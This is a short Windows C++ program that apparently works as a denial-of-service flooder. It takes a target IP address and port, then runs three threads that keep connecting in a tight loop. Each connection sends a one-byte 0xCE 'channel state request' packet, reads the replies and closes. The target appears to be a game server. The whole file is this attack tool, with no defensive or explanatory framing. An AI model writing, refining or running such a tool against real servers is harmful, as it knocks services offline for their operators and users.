#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <windows.h> 
#include <iostream>
#include <memory>

#pragma comment(lib, "ws2_32.lib")

auto CreateSocket(SOCKET * _s)
{
	auto s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == INVALID_SOCKET)
	{
		printf("Could not create socket! Error: %d\n", WSAGetLastError());
		return false;
	}
	if (_s)
		*_s = s;
	return true;
}

auto Connect(SOCKET s, const char* c_szIPAddress, WORD wPort)
{
	struct sockaddr_in server;
	server.sin_addr.s_addr = inet_addr(c_szIPAddress);
	server.sin_family = AF_INET;
	server.sin_port = htons(wPort);

	if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
	{
		printf("Connect fail! Error: %d\n", WSAGetLastError());
		return false;
	}
	return true;
}

auto SendChannelStateRequestPacket(SOCKET s)
{
	char * message = "Î"; // Packet Header: 0xCE - 206
	if (send(s, message, strlen(message), 0) < 0)
	{
		printf("Send fail! Error: %d\n", WSAGetLastError());
		return false;
	}
	return true;
}

auto RecvChannelStateRequestPacketReply(SOCKET s)
{
	char server_reply[100];

	// reply 1
	auto recv_size = recv(s, server_reply, sizeof(server_reply), 0);
	if (recv_size != 15)
	{
		printf("Recv(1) fail! Error: %d\n", WSAGetLastError());
		return false;
	}
	server_reply[recv_size] = '\0';

	// reply 2
	recv_size = recv(s, server_reply, sizeof(server_reply), 0);
	if (recv_size == SOCKET_ERROR)
	{
		printf("Recv(2) fail! Error: %d\n", WSAGetLastError());
		return false;
	}
	server_reply[recv_size] = '\0';

	return true;
}

typedef struct _thread_params
{
	int iThreadID;
	char szIPAddress[16];
	WORD wPort;
} SThreadParams, *PThreadParams;

DWORD WINAPI ThreadRoutine(LPVOID lpParam)
{
	auto param = static_cast<PThreadParams>(lpParam);
	printf("Thread Created: %d(%u)\n", param->iThreadID, GetThreadId(GetCurrentThread()));

	WSADATA wsa;
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != ERROR_SUCCESS)
	{
		printf("WSAStartup Failed. Error Code: %d\n", WSAGetLastError());
		return 0;
	}

	int i = 0;
	SOCKET s = NULL;
	while (1)
	{
		auto bSocketResult = CreateSocket(&s);
		if (bSocketResult)
		{
			auto bConnectRet = Connect(s, param->szIPAddress, param->wPort);
			if (bConnectRet)
			{
				auto bSendRet = SendChannelStateRequestPacket(s);
				if (bSendRet)
				{
					auto bRecvRet = RecvChannelStateRequestPacketReply(s);
					if (bRecvRet)
					{
						printf("Reply received! | Sent data: %d\n", i++);
						closesocket(s);
					}
				}
			}
		}
		Sleep(1);
	}

	WSACleanup();
	return 0;
}

auto main(int argc, char* argv[]) -> int
{
	if (argc != 3) {
		printf("Usage: %s <ip_address> <port>", argv[0]);
		return EXIT_FAILURE;
	}

	auto targetData = new SThreadParams();
	strcpy(targetData->szIPAddress, argv[1]);
	targetData->wPort = (unsigned short)strtoul(argv[2], NULL, 0);

	for (int i = 0; i < 3; ++i) {
		targetData->iThreadID = i;
		CreateThread(nullptr, 0, ThreadRoutine, targetData, 0, 0);
	}

	printf("Initialized, press any key to exit.\n");
	std::cin.get();
	delete targetData;
	return EXIT_SUCCESS;
}

